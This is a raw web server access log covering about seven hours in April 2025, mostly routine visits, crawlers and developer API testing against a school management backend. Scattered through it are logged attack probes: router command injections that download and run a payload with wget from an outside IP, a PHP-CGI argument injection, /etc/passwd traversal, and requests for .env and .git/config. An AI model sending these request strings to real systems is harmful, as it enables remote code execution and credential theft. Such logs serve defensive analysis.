66.94.101.167 - - [13/Apr/2025:21:26:55 +0000] "POST /classes/common/busiFacade.php HTTP/1.1" 404 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
66.94.101.167 - - [13/Apr/2025:21:26:56 +0000] "GET /cgi-bin/admin.cgi?Command=sysCommand&Cmd=ifconfig HTTP/1.1" 404 156 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
66.94.101.167 - - [13/Apr/2025:21:26:57 +0000] "GET /cgi-bin/account_mgr.cgi?cmd=cgi_user_add&name=%27;id;%27 HTTP/1.1" 404 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
66.94.101.167 - - [13/Apr/2025:21:26:59 +0000] "GET /%2e%2e/%2e%2e/etc/passwd HTTP/1.1" 400 157 "-" "-"
66.94.101.167 - - [13/Apr/2025:21:26:59 +0000] "GET /__screenshot-error?file=/etc/passwd HTTP/1.1" 404 157 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
66.94.101.167 - - [13/Apr/2025:21:27:00 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 404 163 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
43.130.53.252 - - [13/Apr/2025:21:27:22 +0000] "GET / HTTP/1.1" 200 858 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
154.81.156.54 - - [13/Apr/2025:21:48:23 +0000] "GET / HTTP/1.1" 200 858 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
45.90.163.37 - - [13/Apr/2025:22:00:53 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 163 "http://14.225.204.42:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
45.90.163.37 - - [13/Apr/2025:22:00:53 +0000] "" 400 0 "-" "-"
154.81.156.54 - - [13/Apr/2025:22:03:36 +0000] "GET / HTTP/1.1" 200 858 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
154.81.156.35 - - [13/Apr/2025:22:07:20 +0000] "GET / HTTP/1.1" 200 858 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
154.81.156.34 - - [13/Apr/2025:22:11:21 +0000] "GET / HTTP/1.1" 200 858 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
59.173.135.239 - - [13/Apr/2025:22:14:00 +0000] "GET / HTTP/1.1" 200 1711 "-" "-"
122.96.29.194 - - [13/Apr/2025:22:14:09 +0000] "GET / HTTP/1.1" 200 1711 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
124.31.107.153 - - [13/Apr/2025:22:14:20 +0000] "GET /favicon.ico HTTP/1.1" 200 3870 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
154.81.156.54 - - [13/Apr/2025:22:33:25 +0000] "GET / HTTP/1.1" 200 858 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
45.90.163.37 - - [13/Apr/2025:22:40:08 +0000] "GET / HTTP/1.1" 200 858 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
70.39.90.210 - - [13/Apr/2025:22:41:44 +0000] "GET /.env HTTP/1.1" 200 858 "-" "Mozilla/5.0; Keydrop.io/1.0(onlyscans.com/about);"
70.39.90.210 - - [13/Apr/2025:22:41:45 +0000] "GET /.git/config HTTP/1.1" 200 858 "-" "Mozilla/5.0; Keydrop.io/1.0(onlyscans.com/about);"
154.81.156.54 - - [13/Apr/2025:22:53:53 +0000] "GET / HTTP/1.1" 200 858 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
176.65.141.38 - - [13/Apr/2025:22:54:08 +0000] "POST /php-cgi/php-cgi.exe?%ADd+cgi.force_redirect%3D0+%ADd+disable_functions%3D%22%22+%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp://input HTTP/1.1" 404 159 "-" "python-requests/2.25.1"
154.81.156.54 - - [13/Apr/2025:23:06:44 +0000] "GET / HTTP/1.1" 200 858 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
154.81.156.35 - - [13/Apr/2025:23:06:49 +0000] "GET / HTTP/1.1" 200 858 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
179.43.175.246 - - [13/Apr/2025:23:09:36 +0000] "GET / HTTP/1.1" 200 1711 "-" "Hello World/1.0"
31.170.22.205 - - [13/Apr/2025:23:14:11 +0000] "POST /cgi-bin/supervisor/Factory.cgi HTTP/1.1" 404 170 "-" "-"
31.170.22.205 - - [13/Apr/2025:23:14:16 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(chmod+777+%2Ftmp%3B+cd+%2Ftmp%3B+wget+http%3A%2F%2F31.170.22.205%2Fdl17%3B+sh+dl17) HTTP/1.1" 200 1711 "-" "-"
31.170.22.205 - - [13/Apr/2025:23:14:17 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(chmod+777+%2Ftmp%3B+cd+%2Ftmp%3B+wget+http%3A%2F%2F31.170.22.205%2Fdl17%3B+sh+dl17) HTTP/1.1" 200 1711 "-" "-"
31.170.22.205 - - [13/Apr/2025:23:14:18 +0000] "GET /cgi-bin/live_api.cgi?page=satellite_list&id=&ip=$(chmod+777+/tmp;cd+/tmp;wget+http://31.170.22.205/dl18;busybox+wget+http://31.170.22.205/dl18;sh+dl18) HTTP/1.1" 200 1711 "-" "-"
31.170.22.205 - - [13/Apr/2025:23:14:18 +0000] "POST /cgi-bin/cstecgi.cgi HTTP/1.1" 404 159 "-" "-"
31.170.22.205 - - [13/Apr/2025:23:14:19 +0000] "POST /php/ping.php HTTP/1.1" 404 152 "-" "-"
15.235.226.162 - - [13/Apr/2025:23:25:49 +0000] "GET / HTTP/1.1" 200 858 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.10586"
15.235.226.162 - - [13/Apr/2025:23:25:49 +0000] "GET /skin/default_1/images/logo.png HTTP/1.1" 200 858 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.10586"
15.235.226.162 - - [13/Apr/2025:23:25:49 +0000] "GET /favicon.ico HTTP/1.1" 200 3667 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.10586"
15.235.226.162 - - [13/Apr/2025:23:25:50 +0000] "GET /login.rsp HTTP/1.1" 200 858 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.10586"
15.235.226.162 - - [13/Apr/2025:23:25:50 +0000] "GET /nobody/favicon.ico HTTP/1.1" 200 858 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.10586"
15.235.226.162 - - [13/Apr/2025:23:25:50 +0000] "GET /image/lgbg.jpg HTTP/1.1" 200 858 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.10586"
45.90.163.37 - - [13/Apr/2025:23:28:42 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 163 "http://14.225.204.42:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
45.90.163.37 - - [13/Apr/2025:23:28:42 +0000] "" 400 0 "-" "-"
154.81.156.54 - - [13/Apr/2025:23:37:53 +0000] "GET / HTTP/1.1" 200 858 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
195.182.25.63 - - [13/Apr/2025:23:41:22 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (Linux; Android 7.0; XT1585) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36"
154.81.156.54 - - [13/Apr/2025:23:41:42 +0000] "GET / HTTP/1.1" 200 858 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
92.255.57.58 - - [13/Apr/2025:23:42:16 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 858 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
154.81.156.34 - - [13/Apr/2025:23:43:10 +0000] "GET / HTTP/1.1" 200 858 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
154.81.156.54 - - [14/Apr/2025:00:05:05 +0000] "GET / HTTP/1.1" 200 858 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
185.255.122.19 - - [14/Apr/2025:00:07:38 +0000] "GET / HTTP/1.1" 200 858 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
147.185.132.138 - - [14/Apr/2025:00:14:42 +0000] "GET / HTTP/1.0" 200 1711 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
154.81.156.35 - - [14/Apr/2025:00:21:01 +0000] "GET / HTTP/1.1" 200 858 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
154.81.156.54 - - [14/Apr/2025:00:34:12 +0000] "GET / HTTP/1.1" 200 858 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
135.237.125.156 - - [14/Apr/2025:00:37:40 +0000] "GET / HTTP/1.1" 200 858 "-" "Mozilla/5.0 zgrab/0.x"
93.174.93.12 - - [14/Apr/2025:00:48:15 +0000] "\x16\x03\x02\x01o\x01\x00\x01k\x03\x02RH\xC5\x1A#\xF7:N\xDF\xE2\xB4\x82/\xFF\x09T\x9F\xA7\xC4y\xB0h\xC6\x13\x8C\xA4\x1C=\x22\xE1\x1A\x98 \x84\xB4,\x85\xAFn\xE3Y\xBBbhl\xFF(=':\xA9\x82\xD9o\xC8\xA2\xD7\x93\x98\xB4\xEF\x80\xE5\xB9\x90\x00(\xC0" 400 157 "-" "-"
154.81.156.54 - - [14/Apr/2025:01:01:00 +0000] "GET / HTTP/1.1" 200 858 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
92.255.57.58 - - [14/Apr/2025:01:04:30 +0000] "GET /actuator/gateway/routes HTTP/1.1" 404 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
154.81.156.34 - - [14/Apr/2025:01:15:33 +0000] "GET / HTTP/1.1" 200 858 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
5.183.209.244 - - [14/Apr/2025:01:18:43 +0000] "GET / HTTP/1.1" 200 1711 "-" "-"
5.183.209.244 - - [14/Apr/2025:01:18:44 +0000] "PUT /v1/agent/service/register  HTTP/1.1" 400 157 "-" "-"
154.81.156.54 - - [14/Apr/2025:01:25:49 +0000] "GET / HTTP/1.1" 200 858 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
123.31.64.247 - - [14/Apr/2025:01:29:21 +0000] "GET / HTTP/1.1" 200 1711 "-" "-"
154.81.156.35 - - [14/Apr/2025:01:33:05 +0000] "GET / HTTP/1.1" 200 858 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
92.255.57.58 - - [14/Apr/2025:01:39:49 +0000] "\x16\x03\x01\x05\xA8\x01\x00\x05\xA4\x03\x03\xE6\xF9\xA0\xBC^\xF5.B\xCA\xB56\xB1\xD3\x8BR\x1E\xD1\xD0\xE5\xED" 400 157 "-" "-"
36.155.101.91 - - [14/Apr/2025:01:48:41 +0000] "GET /boaform/admin/formLogin?username=ec8&psd=ec8 HTTP/1.0" 404 162 "-" "-"
172.171.247.75 - - [14/Apr/2025:01:55:22 +0000] "GET /manager/text/list HTTP/1.1" 200 858 "-" "Mozilla/5.0 zgrab/0.x"
154.81.156.54 - - [14/Apr/2025:02:03:45 +0000] "GET / HTTP/1.1" 200 858 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
165.227.180.103 - - [14/Apr/2025:02:06:37 +0000] "GET / HTTP/1.1" 200 858 "-" "Mozilla/5.0 (compatible)"
165.227.180.103 - - [14/Apr/2025:02:06:37 +0000] "GET /favicon.ico HTTP/1.1" 200 3667 "http://fams.io.vn/" "Mozilla/5.0 (compatible)"
165.227.180.103 - - [14/Apr/2025:02:06:39 +0000] "GET /ads.txt HTTP/1.1" 200 858 "-" "Mozilla/5.0 (compatible)"
52.188.227.37 - - [14/Apr/2025:02:11:33 +0000] "GET /hudson HTTP/1.1" 200 858 "-" "Mozilla/5.0 zgrab/0.x"
185.218.86.4 - - [14/Apr/2025:02:12:44 +0000] "GET / HTTP/1.1" 200 858 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
154.81.156.54 - - [14/Apr/2025:02:21:12 +0000] "GET / HTTP/1.1" 200 858 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
5.183.209.244 - - [14/Apr/2025:02:31:33 +0000] "GET / HTTP/1.1" 200 1711 "-" "-"
5.183.209.244 - - [14/Apr/2025:02:31:34 +0000] "PUT /v1/agent/service/register  HTTP/1.1" 400 157 "-" "-"
154.81.156.54 - - [14/Apr/2025:02:32:53 +0000] "GET / HTTP/1.1" 200 858 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
80.82.77.202 - - [14/Apr/2025:02:42:42 +0000] "\x16\x03\x02\x01o\x01\x00\x01k\x03\x02RH\xC5\x1A#\xF7:N\xDF\xE2\xB4\x82/\xFF\x09T\x9F\xA7\xC4y\xB0h\xC6\x13\x8C\xA4\x1C=\x22\xE1\x1A\x98 \x84\xB4,\x85\xAFn\xE3Y\xBBbhl\xFF(=':\xA9\x82\xD9o\xC8\xA2\xD7\x93\x98\xB4\xEF\x80\xE5\xB9\x90\x00(\xC0" 400 157 "-" "-"
154.81.156.34 - - [14/Apr/2025:02:45:07 +0000] "GET / HTTP/1.1" 200 858 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
154.81.156.35 - - [14/Apr/2025:02:47:21 +0000] "GET / HTTP/1.1" 200 858 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
154.81.156.54 - - [14/Apr/2025:02:56:45 +0000] "GET / HTTP/1.1" 200 858 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
154.81.156.54 - - [14/Apr/2025:03:13:44 +0000] "GET / HTTP/1.1" 200 858 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
194.165.16.165 - - [14/Apr/2025:03:14:06 +0000] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 157 "-" "-"
104.234.115.208 - - [14/Apr/2025:03:17:58 +0000] "GET / HTTP/1.0" 200 1711 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)'"
104.234.115.208 - - [14/Apr/2025:03:18:12 +0000] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03&\xB3\x00\x86bN\xFCQz^\x11\x0B\x8E*\x8D\x83|~\xB7\x84\xFF\xFE\xC1\xF7\x9A\x9A<c0\x8A" 400 157 "-" "-"
104.234.115.208 - - [14/Apr/2025:03:18:26 +0000] "GET / HTTP/1.1" 200 858 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)'"
104.234.115.208 - - [14/Apr/2025:03:21:28 +0000] "\x16\x03\x01\x00\xFA\x01\x00\x00\xF6\x03\x03a\x81q\xAD\x06E\xB6\x8F@g}\xA8W\xE5\xF5R\x11\xAFQ\x85\x0B\x00\x8C\xB4S\x8E&\xB3\xE3<\x1B\x19 \x12-[p\x06\x91\x8B(\xB6\xDDQ\x22\xF4]\xCCy\x89\x05\xADF\x80\x18\x05;\x0B\x17\xE6\xE6\xC3\xE6U\x9A\x002\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 157 "-" "-"
104.234.115.208 - - [14/Apr/2025:03:21:36 +0000] "GET /favicon.ico HTTP/1.1" 200 3667 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)'"
118.68.26.235 - - [14/Apr/2025:03:31:20 +0000] "GET / HTTP/1.1" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 Edg/135.0.0.0"
118.68.26.235 - - [14/Apr/2025:03:31:20 +0000] "GET /static/js/bundle.js HTTP/1.1" 304 0 "http://fams.io.vn/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 Edg/135.0.0.0"
113.168.190.143 - - [14/Apr/2025:03:37:17 +0000] "GET /w00tw00t.at.ISC.SANS.DFind:) HTTP/1.1" 400 157 "-" "-"
54.86.50.139 - - [14/Apr/2025:03:41:15 +0000] "POST /api-python/db/init HTTP/1.1" 200 153 "-" "PostmanRuntime/7.43.3"
154.81.156.54 - - [14/Apr/2025:03:41:37 +0000] "GET / HTTP/1.1" 200 858 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
154.81.156.35 - - [14/Apr/2025:03:59:05 +0000] "GET / HTTP/1.1" 200 858 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
54.86.50.139 - - [14/Apr/2025:04:00:36 +0000] "GET /api-nodejs/users?page=1&search=&grade=&roles=parent&className=11A3&limit=50&phone HTTP/1.1" 502 157 "-" "PostmanRuntime/7.43.3"
52.170.223.97 - - [14/Apr/2025:04:01:01 +0000] "GET /wp-admin/css/ HTTP/1.1" 200 858 "binance.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
54.86.50.139 - - [14/Apr/2025:04:01:05 +0000] "POST /api-nodejs/auth/login HTTP/1.1" 502 157 "-" "PostmanRuntime/7.43.3"
118.68.26.235 - - [14/Apr/2025:04:03:08 +0000] "GET /ws HTTP/1.1" 502 559 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 Edg/135.0.0.0"
54.86.50.139 - - [14/Apr/2025:04:03:16 +0000] "POST /api-nodejs/auth/login HTTP/1.1" 502 157 "-" "PostmanRuntime/7.43.3"
54.86.50.139 - - [14/Apr/2025:04:03:20 +0000] "POST /api-python/db/init HTTP/1.1" 200 153 "-" "PostmanRuntime/7.43.3"
54.86.50.139 - - [14/Apr/2025:04:03:36 +0000] "POST /api-python/db/init HTTP/1.1" 200 153 "-" "PostmanRuntime/7.43.3"
54.86.50.139 - - [14/Apr/2025:04:03:42 +0000] "POST /api-nodejs/auth/login HTTP/1.1" 502 157 "-" "PostmanRuntime/7.43.3"
54.86.50.139 - - [14/Apr/2025:04:03:44 +0000] "POST /api-nodejs/auth/login HTTP/1.1" 502 157 "-" "PostmanRuntime/7.43.3"
54.86.50.139 - - [14/Apr/2025:04:03:46 +0000] "POST /api-nodejs/auth/login HTTP/1.1" 502 157 "-" "PostmanRuntime/7.43.3"
54.86.50.139 - - [14/Apr/2025:04:03:52 +0000] "POST /api-nodejs/auth/login HTTP/1.1" 502 157 "-" "PostmanRuntime/7.43.3"
154.81.156.54 - - [14/Apr/2025:04:04:13 +0000] "GET / HTTP/1.1" 200 858 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
54.86.50.139 - - [14/Apr/2025:04:07:16 +0000] "POST /api-nodejs/auth/login HTTP/1.1" 200 461 "-" "PostmanRuntime/7.43.3"
54.86.50.139 - - [14/Apr/2025:04:07:21 +0000] "GET /api-nodejs/users?page=1&search=&grade=&roles=parent&className=11A3&limit=50&phone HTTP/1.1" 200 91 "-" "PostmanRuntime/7.43.3"
54.86.50.139 - - [14/Apr/2025:04:07:37 +0000] "GET /api-nodejs/users?page=1&search=&grade=&roles=&className=&limit=50&phone HTTP/1.1" 200 24807 "-" "PostmanRuntime/7.43.3"
54.86.50.139 - - [14/Apr/2025:04:07:43 +0000] "GET /api-nodejs/students?page=1&limit=10&search=anhatst2112&classId=&className=&batchId=&batchYear= HTTP/1.1" 200 1292 "-" "PostmanRuntime/7.43.3"
54.86.50.139 - - [14/Apr/2025:04:07:48 +0000] "GET /api-nodejs/teachers?page=1&limit=&search=&className= HTTP/1.1" 200 4426 "-" "PostmanRuntime/7.43.3"
54.86.50.139 - - [14/Apr/2025:04:07:52 +0000] "GET /api-nodejs/classes?grade=10&search=10A1&homeroomTeacherd=tuanpv HTTP/1.1" 200 36 "-" "PostmanRuntime/7.43.3"
54.86.50.139 - - [14/Apr/2025:04:08:01 +0000] "GET /api-nodejs/classes?grade=10&search=&homeroomTeacherd= HTTP/1.1" 200 36 "-" "PostmanRuntime/7.43.3"
54.86.50.139 - - [14/Apr/2025:04:08:06 +0000] "GET /api-nodejs/classes?grade=10&search=&homeroomTeacherd= HTTP/1.1" 200 36 "-" "PostmanRuntime/7.43.3"
54.86.50.139 - - [14/Apr/2025:04:08:11 +0000] "GET /api-nodejs/classes?grade=&search=&homeroomTeacherd= HTTP/1.1" 200 36 "-" "PostmanRuntime/7.43.3"
54.86.50.139 - - [14/Apr/2025:04:08:59 +0000] "POST /api-python/db/init HTTP/1.1" 200 153 "-" "PostmanRuntime/7.43.3"
116.96.77.176 - - [14/Apr/2025:04:12:02 +0000] "OPTIONS /api-nodejs/auth/refresh-token HTTP/1.1" 204 0 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
116.96.77.176 - - [14/Apr/2025:04:12:02 +0000] "OPTIONS /api-nodejs/auth/refresh-token HTTP/1.1" 204 0 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
116.96.77.176 - - [14/Apr/2025:04:12:02 +0000] "POST /api-nodejs/auth/refresh-token HTTP/1.1" 401 82 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
116.96.77.176 - - [14/Apr/2025:04:12:02 +0000] "POST /api-nodejs/auth/refresh-token HTTP/1.1" 401 82 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
116.96.77.176 - - [14/Apr/2025:04:12:12 +0000] "OPTIONS /api-nodejs/auth/login HTTP/1.1" 204 0 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
116.96.77.176 - - [14/Apr/2025:04:12:12 +0000] "POST /api-nodejs/auth/login HTTP/1.1" 200 461 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
116.96.77.176 - - [14/Apr/2025:04:12:14 +0000] "OPTIONS /api-nodejs/users?page=1&search=&grade=&roles=&className=&limit=500&phone HTTP/1.1" 204 0 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
116.96.77.176 - - [14/Apr/2025:04:12:14 +0000] "OPTIONS /api-nodejs/users?page=1&search=&grade=&roles=&className=&limit=500&phone= HTTP/1.1" 204 0 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
116.96.77.176 - - [14/Apr/2025:04:12:14 +0000] "OPTIONS /api-nodejs/users?page=1&search=&grade=&roles=&className=&limit=500&phone= HTTP/1.1" 204 0 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
116.96.77.176 - - [14/Apr/2025:04:12:14 +0000] "OPTIONS /api-nodejs/users?page=1&search=&grade=&roles=&className=&limit=500&phone HTTP/1.1" 204 0 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
116.96.77.176 - - [14/Apr/2025:04:12:18 +0000] "GET /api-nodejs/users?page=1&search=&grade=&roles=&className=&limit=500&phone HTTP/1.1" 200 287990 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
